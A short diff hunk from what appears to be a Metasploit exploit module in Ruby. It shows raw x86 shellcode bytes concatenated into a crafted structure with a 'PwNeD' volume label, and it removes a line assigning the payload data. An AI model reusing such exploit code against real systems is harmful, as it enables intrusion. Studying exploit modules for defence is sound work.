@@ -91,7 +91,5 @@ module Metasploit3
             # Volume Label, default: PwNeD
             encoded_volume_label +
             "\x00\x00\x55\x89\xe5\x31\xc0\x40\x5d\xc2\x0c\x00"
-
-    the_payload  = payload_data
   end
 end
